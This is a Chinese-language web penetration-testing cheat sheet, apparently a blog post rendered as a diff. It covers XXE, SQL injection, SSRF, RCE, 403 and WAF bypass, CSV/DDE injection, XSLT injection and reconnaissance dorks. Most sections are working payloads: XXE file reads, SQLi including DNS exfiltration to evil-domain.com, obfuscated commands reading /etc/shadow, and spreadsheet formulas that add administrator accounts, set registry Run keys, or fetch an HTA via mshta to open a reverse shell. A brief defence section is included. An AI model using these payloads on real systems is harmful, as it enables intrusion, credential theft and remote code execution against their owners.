+&lt;!DOCTYPE test [ &lt;!ENTITY % xxe SYSTEM &quot;http://127.0.0.1:80&quot; &gt; %xxe; ]&gt;
+
+# or
+
+&lt;?xml version=&quot;1.0&quot; ?&gt;
+&lt;!DOCTYPE r [
+&lt;!ELEMENT r ANY &gt;
+&lt;!ENTITY sp SYSTEM &quot;http://127.0.0.1:80&quot;&gt;
+]&gt;
+&lt;r&gt;&amp;sp;&lt;/r&gt;
+</code></pre>
+<pre><code class="language-构造任意文件读取的payload"># pyload
+&lt;?xml version=&quot;1.0&quot; ?&gt;
+&lt;!DOCTYPE r [
+&lt;!ELEMENT r ANY &gt;
+&lt;!ENTITY sp SYSTEM &quot;file:///c:/windows/system32/drivers/etc/hosts&quot;&gt;
+]&gt;
+&lt;r&gt;&amp;sp;&lt;/r&gt;
+
+
+# response
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;response&gt;&lt;header&gt;&lt;actionCode&gt;1&lt;/actionCode&gt;&lt;rspType&gt;7&lt;/rspType&gt;&lt;rspCode&gt;9011&lt;/rspCode&gt;&lt;rspDesc&gt;&lt;![CDATA[请求报文头部不能为空]]&gt;&lt;/rspDesc&gt;&lt;digitalSign /&gt;&lt;rspTime&gt;2020-04-09 16:58:34.877&lt;/rspTime&gt;&lt;/header&gt;&lt;body&gt;&lt;/body&gt;&lt;/response&gt;
+
+# pyload
+&lt;?xml version=&quot;1.0&quot; ?&gt;
+&lt;!DOCTYPE r [
+&lt;!ELEMENT r ANY &gt;
+&lt;!ENTITY sp SYSTEM &quot;file:///c:/windows/system32/drivers/etc/hosts1&quot;&gt;
+]&gt;
+
+&lt;r&gt;&amp;sp;&lt;/r&gt;
+
+# response
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;response&gt;&lt;header&gt;&lt;actionCode&gt;1&lt;/actionCode&gt;&lt;rspType&gt;7&lt;/rspType&gt;&lt;rspCode&gt;7000&lt;/rspCode&gt;&lt;rspDesc&gt;&lt;![CDATA[接口程序执行错误]]&gt;&lt;/rspDesc&gt;&lt;digitalSign /&gt;&lt;rspTime&gt;2020-04-09 17:01:08.121&lt;/rspTime&gt;&lt;/header&gt;&lt;body&gt;&lt;/body&gt;&lt;/response&gt;
+</code></pre>
+<p>--&gt;<a href="https://xz.aliyun.com/t/6887?time__1311=n4%2BxnD0Dg7excGiD%2FAe0%3DGOD9l9eDCWRR0IYeD">从XML相关一步一步到XXE漏洞</a></p>
+<p>--&gt;<a href="https://www.cnblogs.com/mysticbinary/p/12668547.html">XXE漏洞的利用</a></p>
+<h2>sqli --绕不过的</h2>
+<p>报错注入,联合注入，盲注....</p>
+<pre><code>经典 SQLI
+ 基于错误的 SQLi：
+        输入：&#39; OR 1=1 -- （单引号后加 OR 1=1 和注释）
+        预期结果：显示 SQL 语法或表/列名称的数据库错误信息。
+        为什么有效？OR 1=1 条件始终为真，导致查询返回所有行，注释 (--) 实际上忽略了原始查询的其余部分。
+
+    基于联合的 SQLi：
+        输入：&#39; UNION SELECT username, password FROM users --
+        预期结果：如果存在漏洞，应用程序将从 &quot;users &quot;表中返回用户名和密码以及原始查询结果。
+        为什么有效UNION 运算符结合了两个 SELECT 语句的结果，允许攻击者从其他表中检索数据
+
+盲 SQLi
+
+    基于布尔的 SQLi：
+        输入： &#39; AND 1=1 -- （真条件）
+        预期结果：应用程序的响应应与正常请求相同。
+        输入： &#39; AND 1=2 -- （错误条件）
+        预期结果：应用程序的响应应不同于正常请求。
+        为什么有效：攻击者可以通过观察应用程序的响应如何随注入条件的变化而变化来推断数据库的信息
+
+    基于时间的 SQLi：
+        输入： &#39; AND SLEEP(5) -- （休眠 5 秒钟）
+        预期结果：如果注入成功，应用程序的响应将延迟 5 秒。
+        ○ 为何有效：SLEEP 功能会使数据库在指定时间内暂停，攻击者可以通过观察响应时间来推断注入是否有效。
+
+外部 SQLI
+
+    基于 DNS 的渗透：
+        输入： &#39; UNION SELECT LOAD_FILE(concat(&#39;\\\\&#39;,@@version,&#39;.evil-domain.com\\abc&#39;))--
+</code></pre>
+<p>----&gt; <code>[python脚本/sqli]</code>自己写的测试小脚本</p>
+<h2>ssrf</h2>
+<p>ssrf分为五类，分别是</p>
+<ol>
+<li>基本 SSRF：
+攻击者可以访问互联网上任何可公开访问的资源。</li>
+<li>盲人 SSRF：
+攻击者无法看到服务器端请求的响应，但仍可根据应用程序的行为推断信息。</li>
+<li>带身份验证旁路的 SSRF：
+攻击者可以绕过身份验证机制访问受限资源。</li>
+<li>SSRF 到 Localhost：
+攻击者可以访问与网络应用程序运行在同一服务器上的服务。</li>
+<li>SSRF 到云元数据端点：
+攻击者可访问存储在云元数据服务中的敏感信息</li>
+</ol>
+<p>tools：ffuf/Kiterunner/SSRFmap</p>
+<p>可以看看这个师傅的，很详细的描述了ssrf实例和绕过手法</p>
+<p><a href="https://www.freebuf.com/articles/web/333318.html">从0到1完全掌握 SSRF</a></p>
+<p>不过这个我也是第一次见完整的</p>
+<pre><code>[协议类型]://[访问资源需要的凭证信息]@[服务器地址]:[端口号]/[资源层级UNIX文件路径][文件名]?[查询]#[片段ID]
+</code></pre>
+<p><a href="https://xz.aliyun.com/t/7495?time__1311=n4%2BxnD0Dy7GQ3AKeD5DsA3rxIx7T5%2BAO4Y5qRUQx">DNS重绑定</a></p>
+<p>看不懂的话可以看这个<a href="https://blog.csdn.net/qq_36348899/article/details/119297854">详解DNS重绑定攻击</a></p>
+<h2>rce</h2>
+<p>当攻击者诱使网络应用程序或系统执行他们提供的代码时，就会出现 RCE 漏洞。这些代码可以是简单的命令，也可以是复杂的脚本，可用于执行各种恶意活动</p>
+<h3>RCE危害</h3>
+<p>目标系统执行攻击者的有效载荷，允许攻击者运行其代码，并有可能获得系统的控制权 攻击者的收益：攻击者现在可以执行各种操作，例如
+窃取敏感数据
+安装恶意软件
+修改系统文件
+发动进一步攻击</p>
+<h3>RCE类型</h3>
+<ul>
+<li>命令注入：攻击者可将操作系统命令注入网络应用程序的输入中</li>
+<li>代码注入：代码注入：攻击者将代码注入网络应用程序的输入，然后由应用程序的解释器（如 PHP、Python、Java）执行</li>
+<li>反序列化漏洞：当序列化数据被应用程序反序列化时，攻击者可以操纵序列化数据执行任意代码</li>
+<li>文件上传漏洞：攻击者可将恶意文件上传到网络应用程序，然后在服务器上执行该文件</li>
+</ul>
+<p>（原来文件上传和反序列化也算rce么）</p>
+<h3>简单的rce载荷</h3>
+<pre><code>; whoami
+$(whoami)
+| whoami
+|| whoami
+&amp;&amp; whoami
+</code></pre>
+<h3>顺便一提   SSTI模板注入</h3>
+<p><img src="https://pic1.imgdb.cn/item/678334d3d0e0a243d4f389ac.png" alt=""></p>
+<p>图片来源--&gt;<a href="https://www.cnblogs.com/JKding233/p/17725100.html">JKding233师傅</a></p>
+<p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">SSTI（模板注入）漏洞（入门篇）</a></p>
+<p><strong>墙裂推荐</strong>上面那篇，师傅很详细的列举了多种模板的SSTI</p>
+<h2>403-bypass</h2>
+<p>404是not found，403是forbidden，也就是禁止访问</p>
+<p>比较常见的绕过就是</p>
+<ol>
+<li>换请求方法，换成<code>GET, HEAD, POST, PUT, DELETE, CONNECT, OPTIONS, TRACE, PATCH, INVENTED, HACK</code></li>
+<li>绕过Ip限制</li>
+</ol>
+<pre><code>X-Originating-IP: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+X-Forwarded: 127.0.0.1
+Forwarded-For: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-ProxyUser-Ip: 127.0.0.1
+X-Original-URL: 127.0.0.1
+Client-IP: 127.0.0.1
+True-Client-IP: 127.0.0.1
+Cluster-Client-IP: 127.0.0.1
+X-ProxyUser-Ip: 127.0.0.1
+Host: localhost
+</code></pre>
+<ol start="3">
+<li>url绕过
+通过使用<code>X-Original-URL</code>头部，或者<code>X-Rewrite-URL</code>等覆盖原来请求URL的路径</li>
+</ol>
+<pre><code class="language-一个请求包实例">GET / HTTP/1.1
+X-Original-URL: /admin/console
+X-Rewrite-URL: /admin/console
+Host: www.abc.com
+Host: 192.168.126.6
+</code></pre>
+<ol start="4">
+<li>路径fuzz，比如<code>/admin/</code>改成<code>/admin</code>或者<code>/admin/./</code>等等</li>
+</ol>
+<pre><code>abc.com/admin =&gt; 403
+abc.com/admin/ =&gt; 200
+abc.com/admin// =&gt; 200
+abc.com//admin// =&gt; 200
+abc.com/admin/* =&gt; 200
+abc.com/admin/*/ =&gt; 200
+abc.com/admin/. =&gt; 200
+abc.com/admin/./ =&gt; 200
+abc.com/./admin/./ =&gt; 200
+abc.com/admin/./. =&gt; 200
+abc.com/admin/./. =&gt; 200
+abc.com/admin? =&gt; 200
+abc.com/admin?? =&gt; 200
+abc.com/admin??? =&gt; 200
+abc.com/admin…;/ =&gt; 200
+abc.com/admin/…;/ =&gt; 200
+abc.com/%2f/admin =&gt; 200
+abc.com/%2e/admin =&gt; 200
+abc.com/admin%20/ =&gt; 200
+abc.com/admin%09/ =&gt; 200
+abc.com/%20admin%20/ =&gt; 200
+</code></pre>
+<p>其他的<a href="https://github.com/cpkkcb/fuzzDicts">fuzz-dicts</a></p>
+<h2>waf-bypass</h2>
+<p>🤔
+🤔
+🤔
+🤔
+🤔
+🤔</p>
+<p>tools：wafw00f/BYPASSwaf/</p>
+<p>绕过手法：</p>
+<ul>
+<li>1.大小写绕过
+像是这样</li>
+</ul>
+<pre><code class="language-PHP">基本要求：
+
+&lt;script&gt;confirm()&lt;/script&gt;
+
+旁路技术：
+
+ &lt;ScrIpT&gt;confirm()&lt;/sCRiPt&gt;
+
+基本要求：
+
+SELECT * FROM * WHERE OWNER = &#39;NAME_OF_DB&#39;
+
+旁路技术：
+
+sELeCt * fRoM * wHerE OWNER = &#39;NAME_OF_DB&#39;
+</code></pre>
+<ul>
+<li>URL编码</li>
+</ul>
+<pre><code class="language-likethis">被 WAF 屏蔽：
+
+ &lt;Svg/x=&quot;&gt;&quot;/OnLoAD=confirm()//
+
+旁路技术：
+
+ %3CSvg%2Fx%3D%22%3E%22%2FOnLoAD%3Dconfirm%28%29%2F%2F
+
+被 WAF 屏蔽：
+
+ UniOn(SeLeCt 1,2,3,4,5,6,7,8,9,10)
+
+旁路技术：
+
+ UniOn%28SeLeCt+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%29
+</code></pre>
+<ul>
+<li>ASCII编码</li>
+</ul>
+<pre><code>基本要求：
+
+ &lt;marquee onstart=prompt()&gt;
+
+混淆视听：
+
+ &lt;marquee onstart=\u0070r\u06f\u006dpt()&gt;
+
+被 WAF 屏蔽：
+
+ /?redir=http://google.com
+
+旁路技术：
+
+ /?redir=http://google。com (Unicode alternative)
+
+被 WAF 屏蔽：
+
+ &lt;marquee loop=1 onfinish=alert()&gt;x
+
+旁路技术：
+
+ ＜marquee loop＝1 onfinish＝alert︵1)&gt;x (Unicode alternative)
+
+基本要求：
+
+ ../../etc/shadow
+
+混淆视听：
+
+ %C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFshadow
+</code></pre>
+<ul>
+<li>HTML编码</li>
+</ul>
+<pre><code>基本要求：
+
+ &quot;&gt;&lt;img src=x onerror=confirm()&gt;
+
+编码有效载荷：
+
+ &amp;quot;&amp;gt;&amp;lt;img src=x onerror=confirm&amp;lpar;&amp;rpar;&amp;gt;
+
+编码有效载荷：
+
+ &amp;#34;&amp;#62;&amp;#60;img src=x onerror=confirm&amp;#40;&amp;#41;&amp;#62;
+</code></pre>
+<ul>
+<li>混合编码</li>
+<li>添加注释</li>
+</ul>
+<pre><code>被 WAF 屏蔽：
+
+ &lt;script&gt;confirm()&lt;/script&gt;
+
+旁路技术：
+
+ &lt;!--&gt;&lt;script&gt;confirm/**/()/**/&lt;/script&gt;
+
+被 WAF 屏蔽：
+
+ /?id=1+union+select+1,2--
+
+旁路技术：
+
+ /?id=1+un/**/ion+sel/**/ect+1,2--
+</code></pre>
+<ul>
+<li>双重编码</li>
+</ul>
+<pre><code>基本要求：
+
+ http://example/cgi/../../winnt/system32/cmd.exe?/c+dir+c:\
+
+混淆有效载荷
+
+ http://example/cgi/%252E%252E%252F%252E%252E%252Fwinnt/system32/cmd.exe?/c+dir+c:\
+
+基本要求：
+
+ &lt;script&gt;confirm()&lt;/script&gt;
+
+混淆有效载荷
+
+ %253Cscript%253Econfirm()%253C%252Fscript%253E
+</code></pre>
+<ul>
+<li>通配符混淆</li>
+</ul>
+<pre><code>基本要求：
+
+ /bin/cat /etc/passwd
+
+混淆有效载荷
+
+ /???/??t /???/??ss??
+
+使用过的字符
+
+ / ? t s
+
+基本要求：
+
+ /bin/nc 127.0.0.1 443
+
+混淆有效载荷
+
+ /???/n? 2130706433 443
+
+使用过的字符
+
+ / ? n [0-9]
+
+ 基本要求：
+
+ &lt;script&gt;confirm()&lt;/script&gt;
+
+混淆有效载荷
+
+ &lt;script&gt;eval(&#39;con&#39;+&#39;fi&#39;+&#39;rm()&#39;)&lt;/script&gt;
+
+基本要求：
+
+ /bin/cat /etc/shadow
+
+混淆有效载荷
+
+ /bi&#39;n&#39;&#39;&#39;/c&#39;&#39;at&#39; /e&#39;tc&#39;/sh&#39;&#39;ad&#39;ow
+
+Bash 允许执行路径连接
+
+基本要求：
+
+ &lt;iframe/onload=&#39;this[&quot;src&quot;]=&quot;javascript:confirm()&quot;&#39;;&gt;
+
+混淆有效载荷
+
+ &lt;iframe/onload=&#39;this[&quot;src&quot;]=&quot;jav&quot;+&quot;as&amp;Tab;cr&quot;+&quot;ipt:con&quot;+&quot;fir&quot;+&quot;m()&quot;&#39;;&gt;
+
+</code></pre>
+<ul>
+<li>垃圾字符</li>
+</ul>
+<pre><code>基本要求：
+
+ &lt;script&gt;confirm()&lt;/script&gt;
+
+混淆有效载荷
+
+ &lt;script&gt;+-+-1-+-+confirm()&lt;/script&gt;
+
+基本要求：
+
+ &lt;BODY onload=confirm()&gt;
+
+混淆有效载荷
+
+&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=confirm()&gt;
+
+
+基本要求：
+
+
+
+ &lt;a href=javascript;alert()&gt;ClickMe
+
+
+
+旁路技术：
+
+
+
+ &lt;a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=j&amp;#97v&amp;#97script&amp;#x3A;&amp;#97lert(1)&gt;ClickMe
+</code></pre>
+<ul>
+<li>中断换行</li>
+</ul>
+<pre><code>基本要求：
+
+ &lt;iframe src=javascript:confirm(hacker)&quot;&gt;
+
+混淆有效载荷
+
+ &lt;iframe src=&quot;%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(hacker)&quot;&gt;
+</code></pre>
+<ul>
+<li>未初始化变量</li>
+</ul>
+<pre><code>使用未初始化的 bash 变量来规避基于正则表达式的错误过滤器。
+这种值等于 null，作用类似于空字符串。
+
+一级混淆：正常
+
+  基本要求：
+    ● /bin/cat /etc/shadow
+  混淆有效载荷
+    ● /bin/cat$u /etc/shadow$u
+
+第二层混淆：基于位置
+
+  基本要求：
+    ● /bin/cat /etc/shadow
+  混淆有效载荷
+    ● $u/bin$u/cat$u $u/etc$u/shadow$u
+
+第三级混淆：随机字符
+
+  基本要求：
+    ● /bin/cat /etc/passwd
+  混淆有效载荷
+    ● $aaaaaa/bin$bbbbbb/cat$ccccccc $dddddd/etc$eeeeeee/passwd$fffffff
+</code></pre>
+<ul>
+<li>制表符和换行</li>
+</ul>
+<pre><code>基本要求：
+
+ &lt;IMG SRC=&quot;javascript:confirm();&quot;&gt;
+
+旁路技术：
+
+ &lt;IMG SRC=&quot; javascript:confirm();&quot;&gt;
+
+变体：
+
+ &lt;IMG SRC=&quot; jav ascri pt:confirm ();&quot;&gt;
+
+基本要求：
+
+ http://test.com/test?id=1 union select 1,2,3
+
+旁路技术：
+
+ http://test.com/test?id=1%09union%23%0A%0Dselect%2D%2D%0A%0D1,2,3
+
+基本要求：
+
+ &lt;iframe src=javascript:confirm()&gt;&lt;/iframe&gt;
+
+混淆有效载荷
+
+&lt;iframe src=j&amp;Tab;a&amp;Tab;v&amp;Tab;a&amp;Tab;s&amp;Tab;c&amp;Tab;r&amp;Tab;i&amp;Tab;p&amp;Tab;t&amp;Tab;:c&amp;Tab;o&amp;Tab;n&amp;Tab;f&amp;Tab;i&amp;Tab;r&amp;Tab;m&amp;Tab;%28&amp;Tab;%29&gt;&lt;/iframe&gt;
+</code></pre>
+<h2>新学的-csv注入</h2>
+<p>原理：</p>
+<ol>
+<li>excel工作原理：excel的一个特性：单元格中的第一个字符是“+、-、@、=”这样的符号时，他会以一个表达式的形式被处理</li>
+<li>DDE。动态数据交换（DDE），是Windows下进程间通信协议，支持Microsoft Excel，LibreOffice和Apache OpenOffice。Excel、Word、Rtf、Outlook都可以使用这种机制，根据外部应用的处理结果来更新内容。因此，如果我们制作包含DDE公式的CSV文件，那么在打开该文件时，Excel就会尝试执行外部应用。</li>
+</ol>
+<p>比如说你在里面搞一个<code>=1+cmd|&#39;/C calc&#39;!A0</code>,按理说应该会弹计算器，但是win11已经知道这个并给他搞出去了</p>
+<p><img src="https://pic1.imgdb.cn/item/6785b71cd0e0a243d4f40a3f.png" alt=""></p>
+<p>看了眼人家成功时是2023.3，难怪了</p>
+<h3>利用方式</h3>
+<ul>
+<li>添加用户：<code>=cmd|&#39;/C net user test 123456 /add&#39;!A0+&lt;br&gt;=cmd|&#39;/C net user test 123456 /add &amp;&amp; net localgroup administrators test /add&#39;!A0</code></li>
+<li>修改注册表：<code>=cmd|&#39;/C reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v calc /t REG_SZ /d &quot;calc.exe&quot; /f&#39;!A0</code></li>
+<li>反弹shell：可以和msf结合起来,msf这边</li>
+</ul>
+<pre><code class="language-payload">use exploit/windows/misc/hta_server
+msf exploit(windows/misc/hta_server) &gt; set srvhost 192.168.174.129
+msf exploit(windows/misc/hta_server) &gt; exploit
+</code></pre>
+<p>excel添加载荷</p>
+<pre><code class="language-载荷">+1+cmd|&#39;/c mshta.exe http://192.168.192.135:8080/770MqXy.hta
+&#39;!A0
+</code></pre>
+<ul>
+<li>信息泄露：<code>=HYPERLINK(&quot;https://attack.com?data=&quot;&amp;A1,&quot;click me&quot;)</code></li>
+<li>网络钓鱼：<code>=HYPERLINK(&quot;https://attack.com?data=&quot;&amp;A1,&quot;click me&quot;)</code></li>
+</ul>
+<p>或者是控制浏览器访问钓鱼网站<code>=1+cmd|&#39;/C   &quot;C:\Users\ASUS\AppData\Local\Google\Chrome\Application\chrome.exe&quot; https://attack.com &#39;!A0</code></p>
+<h3>绕过方式:</h3>
+<p>在等于号被过滤时，可以通过运算符+-的方式绕过；</p>
+<p><code>-1+1+cmd |’ /C calc’ !A0</code></p>
+<p>参数处输入以下 Payload，%0A被解析，从而后面的数据跳转到下一行：</p>
+<p><code>%0A-1+1+cmd|&#39; /C calc&#39;!A0</code></p>
+<p>导出文件为 csv 时，若系统在等号=前加了引号’过滤，则可以使用分号绕过，分号；可分离前后两部分内容使其分别执行：</p>
+<p><code>;-3+3+cmd|&#39; /C calc&#39;!D2</code></p>
+<p>其他常用 Payload：</p>
+<p><code>@SUM(cmd|&#39;/c calc&#39;!A0)</code></p>
+<p><code>=HYPERLINK(&quot;https://attact.com&quot;)</code></p>
+<h3>防御思路</h3>
+<p>单元格不以特殊字符开头：<code>+,-,@,=</code></p>
+<p>禁止导出CSV，XLS格式文件</p>
+<p>黑名单过滤<code>=(-)cmd或=(-)HYPERLINK</code>或<code>=(-)concat</code>等</p>
+<p>还有，在大部分情况下都会弹出Microsoft Office安全提示，只要不点“是”就行了，所以对于平时常规文件的传递中，要尽量为员工做好相关的安全意识培训来做相关的防范。</p>
+<h2>XSLT注入</h2>
+<p>SLT (Extensible Stylesheet Language Transformations)  是一种转换语言，主要是将一种XML文档转换为另外一种XML文档，或者其他格式的文档，例如：HTML和文本等。XSLT 使用 XPath 在 XML 文档中查找信息。XPath 被用来通过元素和属性在 XML 文档中进行导航。</p>
+<pre><code class="language-显示后台信息">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;html xsl:version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:php=&quot;http://php.net/xsl&quot;&gt;
+    &lt;body&gt;
+        &lt;xsl:text&gt;xsl:vendor = &lt;/xsl:text&gt;&lt;xsl:value-of select=&quot;system-property(&#39;xsl:vendor&#39;)&quot;/&gt;&lt;br/&gt;
+        &lt;xsl:text&gt;xsl:version = &lt;/xsl:text&gt;&lt;xsl:value-of select=&quot;system-property(&#39;xsl:version&#39;)&quot;/&gt;&lt;br/&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<pre><code class="language-在php中注入">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;html xsl:version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:php=&quot;http://php.net/xsl&quot;&gt;
+    &lt;body&gt;
+        &lt;xsl:value-of name=&quot;bugbounty&quot; select=&quot;php:function(&#39;phpinfo&#39;)&quot;/&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p><a href="https://xz.aliyun.com/t/33?time__1311=n4Rx0DRDB7i%3DCq0vo4%2BxCq7KG%3D3jEdoubD">【译】XSLT attack</a></p>
+<h2>信息收集</h2>
+<pre><code class="language-osint">https://osintframework.com/
+https://i-intelligence.eu/uploads/public-documents/OSINT_Handbook_2020.pdf
+https://start.me/p/DPYPMz/the-ultimate-osint-collection
+https://docs.google.com/spreadsheets/d/18rtqh8EG2q1xBo2cLNyhIDuK9jrPGwYr9DI2UncoqJQ
+https://cipher387.github.io/
+</code></pre>
+<pre><code class="language-osint"># Multipurpose
+https://shodan.io/
+https://censys.io/
+https://onyphe.io/
+https://app.netlas.io/
+https://hunter.how/
+https://fofa.so/
+https://fullhunt.io/
+https://www.zoomeye.org/
+https://www.criminalip.io/
+https://leakix.net/
+https://www.yougetsignal.com/
+https://intelx.io/
+https://pentest-tools.com/
+https://gofindwhois.com/
+https://gofindwho.com/
+# Public info gathering
+
+# Track website changes
+https://visualping.io/
+https://web.archive.org
+
+# Companies info
+https://opencorporates.com/companies
+
+# Domain Recon
+https://www.robtex.com/
+https://centralops.net
+https://viewdns.info/
+https://phpinfo.me/domain
+http://bgp.he.net/
+https://bgpview.io/
+https://suip.biz/
+https://dnsdumpster.com/
+https://www.whoxy.com/
+http://ipv4info.com/
+https://rapiddns.io/
+https://myip.ms/
+https://www.reversewhois.io/?
+https://www.whoxy.com/reverse-whois/
+https://reverse-whois.whoisxmlapi.com/api
+https://host.io/dashboard
+https://completedns.com/dns-history/
+</code></pre>
+<pre><code class="language-邮件服务器黑名单">http://multirbl.valli.org/
+</code></pre>
+<pre><code class="language-验证电子邮件">https://tools.emailhippo.com/
+</code></pre>
+<pre><code class="language-暗网曝光">https://immuniweb.com/radar/
+</code></pre>
+<pre><code class="language-新收购">https://crunchbase.com/
+</code></pre>
+<pre><code class="language-api">https://www.postman.com/explore/
+https://rapidapi.com/
+</code></pre>
+<pre><code class="language-应用程序接口">https://serene-agnesi-57a014.netlify.app/
+</code></pre>
+<pre><code class="language-ecif">https://exif-viewer.com/
+</code></pre>
+<h3>google语法</h3>
+<pre><code class="language-赏金">宽域搜索/否定搜索
+
+ site:example.com -www -shop -share -ir -mfa
+
+带参数的 PHP 扩展
+
+ site:example.com ext:php inurl:?
+
+应用程序接口端点
+
+ site:example[.]com inurl:api | site:*/rest | site:*/v1 | site:*/v2 | site:*/v3
+
+多汁的扩展
+
+site:&quot;example[.]com&quot; ext:log | ext:txt | ext:conf | ext:cnf | ext:ini | ext:env | ext:sh | ext:bak | ext:backup | ext:swp | ext:old | ext:~ | ext:git | ext:svn | ext:htpasswd | ext:htaccess | ext:json
+
+
+高百分比 inurl 关键字
+
+inurl:conf | inurl:env | inurl:cgi | inurl:bin | inurl:etc | inurl:root | inurl:sql | inurl:backup | inurl:admin | inurl:php site:example[.]com
+
+
+服务器错误
+
+inurl:&quot;error&quot; | intitle:&quot;exception&quot; | intitle:&quot;failure&quot; | intitle:&quot;server at&quot; | inurl:exception | &quot;database error&quot; | &quot;SQL syntax&quot; | &quot;undefined index&quot; | &quot;unhandled exception&quot; | &quot;stack trace&quot; site:example[.]com
+
+
+易发生 XSS 的参数
+
+
+
+ inurl:q= | inurl:s= | inurl:search= | inurl:query= | inurl:keyword= | inurl:lang= inurl:&amp; site:example.com
+
+
+
+打开重定向容易参数
+
+
+
+ inurl:url= | inurl:return= | inurl:next= | inurl:redirect= | inurl:redir= | inurl:ret= | inurl:r2= | inurl:page= inurl:&amp; inurl:http site:example.com
+
+
+
+SQLi 易错参数
+
+
+
+ inurl:id= | inurl:pid= | inurl:category= | inurl:cat= | inurl:action= | inurl:sid= | inurl:dir= inurl:&amp; site:example.com
+
+
+
+SSRF 易损参数
+
+inurl:http | inurl:url= | inurl:path= | inurl:dest= | inurl:html= | inurl:data= | inurl:domain= | inurl:page= inurl:&amp; site:example.com
+
+
+LFI 易损参数
+`
+inurl:include | inurl:dir | inurl:detail= | inurl:file= | inurl:folder= | inurl:inc= |inurl:locate= | inurl:doc= | inurl:conf= inurl:&amp; site:example.com
+
+
+易发生 RCE 的参数
+
+`
+inurl:cmd | inurl:exec= | inurl:query= | inurl:code= | inurl:do= | inurl:run= | inurl:read=  | inurl:ping= inurl:&amp; site:example.com
+
+
+文件上传端点
+
+
+
+ site:example.com ”choose file”
+
+
+
+应用程序接口文档
+
+
+
+ inurl:apidocs | inurl:api-docs | inurl:swagger | inurl:api-explorer site:&quot;example[.]com&quot;
+
+
+
+登录页面
+
+
+
+ inurl:login | inurl:signin | intitle:login | intitle:signin | inurl:secure site:example[.]com
+
+
+
+敏感文件
+
+
+
+ site:example.com ext:txt | ext:pdf | ext:xml | ext:xls | ext:xlsx | ext:ppt | ext:pptx | ext:doc | ext:docx
+
+
+ intext:“confidential” | intext:“Not for Public Release” | intext:”internal use only” | intext:“do not distribute”
+
+
+
+敏感参数
+
+
+
+ inurl:email= | inurl:phone= | inurl:password= | inurl:secret= inurl:&amp; site:example[.]com
+
+
+
+Adobe 体验管理器（AEM）
+
+inurl:/content/usergenerated | inurl:/content/dam | inurl:/jcr:content | inurl:/libs/granite | inurl:/etc/clientlibs | inurl:/content/geometrixx | inurl:/bin/wcm | inurl:/crx/de site:example[.]com
+
+
+已披露的 XSS 和开放式重定向
+
+
+
+ site:openbugbounty.org inurl:reports intext:&quot;example.com&quot;
+
+
+
+代码泄漏
+
+
+
+ site:pastebin.com &quot;example.com&quot;
+
+
+
+ site:jsfiddle.net &quot;example.com&quot;
+
+
+
+ site:codebeautify.org &quot;example.com&quot;
+
+
+
+ site:codepen.io &quot;example.com&quot;
+
+
+
+云存储
+
+
+
+ site:s3.amazonaws.com &quot;example.com&quot;
+
+
+
+ site:blob.core.windows.net &quot;example.com&quot;
+
+
+
+ site:googleapis.com &quot;example.com&quot;
+
+
+
+ site:drive.google.com &quot;example.com&quot;
+
+
+
+ site:dev.azure.com &quot;example[.]com&quot;
+
+
+
+ site:onedrive.live.com &quot;example[.]com&quot;
+
+
+
+ site:digitaloceanspaces.com &quot;example[.]com&quot;
+
+
+
+ site:sharepoint.com &quot;example[.]com&quot;
+
+
+
+ site:s3-external-1.amazonaws.com &quot;example[.]com&quot;
+
+
+
+ site:s3.dualstack.us-east-1.amazonaws.com &quot;example[.]com&quot;
+
+
+
+ site:dropbox.com/s &quot;example[.]com&quot;
+
+
+
+ site:box.com/s &quot;example[.]com&quot;
+
+
+
+ site:docs.google.com inurl:&quot;/d/&quot; &quot;example[.]com&quot;
+
+JFrog Artifactory
+
+site:jfrog.io &quot;example[.]com&quot;
+
+Firebase
+
+site:firebaseio.com &quot;example[.]com&quot;
+
+漏洞悬赏计划和漏洞披露计划
+
+ &quot;submit vulnerability report&quot; | &quot;powered by bugcrowd&quot; | &quot;powered by hackerone&quot;
+
+ site:*/security.txt &quot;bounty&quot;
+
+阿帕奇服务器状态曝光
+
+ site:*/server-status apache
+
+WordPress
+
+ inurl:/wp-admin/admin-ajax.php
+
+Drupal
+
+ intext:&quot;Powered by&quot; &amp; intext:Drupal &amp; inurl:user
+
+Joomla
+
+ site:*/joomla/login
+</code></pre>
+<h2>shadon语法</h2>
+<pre><code class="language-shadon">1. org:&quot;http://target. com&quot;
+2. http.status:&quot;&lt;status_code&gt;&quot;
+3. product:&quot;&lt;Product_Name&gt;&quot;
+4. port:&lt;Port_Number&gt; “Service_Message”
+5. port:&lt;Port_Number&gt; “Service_Name”
+6. http.component:&quot;&lt;Component_Name&gt;&quot;
+7. http.component_category:&quot;&lt;Component_Category&gt;
+8. http.waf:&quot;&lt;firewall_name&gt;&quot;
+9. http.html:&quot;&lt;Name&gt;&quot;
+10. http.title:&quot;&lt;Title_Name&gt;&quot;
+11. ssl.alpn:&quot;&lt;Protocol&gt;&quot;
+12. http.favicon.hash:&quot;&lt;Favicon_Hash&gt;&quot;
+13. net:&quot;&lt;Net_Range&gt;&quot; (for e.g. 104.16.100.52/32)
+14. http://ssl.cert.subject.cn:&quot;&lt;http://Domain .com&gt;&quot;
+15. asn:&quot;&lt;ASnumber&gt;&quot;
+16. hostname:&quot;&lt;hosthame&gt;&quot;
+17. ip:&quot;&lt;IP_Address&gt;&quot;
+18. all:&quot;&lt;Keyword&gt;&quot;
